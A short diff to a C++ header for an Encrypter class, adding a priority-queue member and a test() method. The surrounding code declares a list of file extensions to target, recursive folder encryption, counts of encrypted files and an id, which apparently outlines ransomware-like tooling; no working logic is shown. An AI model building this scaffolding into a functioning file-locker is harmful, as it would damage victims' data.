@@ -2,6 +2,7 @@
 #define ENCRYPTER_H
 
 #include <stdint.h>
+#include "priority_queue.h"
 
 // Encrypt file with the next extensions:
 const char extensions[][7] = {
@@ -30,6 +31,7 @@ public:
   virtual void recursive(option, string) = 0; // encrypt/decrypt folder
   virtual uint getCantEncrypted() = 0;
   virtual uint getCantDecrypted() = 0;
+  virtual void test() = 0;
 };
 
 class Encrypter : public IController {
@@ -37,6 +39,7 @@ private:
   uint8_t* key;
   uint cant_encrypted;
   uint cant_decrypted;
+  PriorityQueue* pq;
 
   char* id;
   uint len;
@@ -57,6 +60,7 @@ public:
   virtual void recursive(option, string);
   virtual uint getCantEncrypted();
   virtual uint getCantDecrypted();
+  virtual void test();
 };
 
 #endif
